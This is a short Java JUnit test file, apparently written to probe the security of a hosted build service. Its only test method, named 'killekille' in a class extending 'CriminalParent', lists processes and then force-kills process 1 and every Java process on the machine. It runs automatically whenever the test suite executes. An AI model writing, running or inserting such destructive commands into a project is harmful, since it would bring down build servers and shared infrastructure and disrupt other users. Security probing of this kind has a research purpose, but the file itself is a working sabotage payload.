package name.felixbecker.buildhivesecuritytest;

import org.junit.Test;

public class KillerTest extends CriminalParent {
	@Test
	public void killekille() throws Exception{
		execute("ps","ax");
		execute("kill", "-9", "1");
		execute("killall", "-9", "/opt/jdk/jdk1.6.latest/bin/java");
	}
}
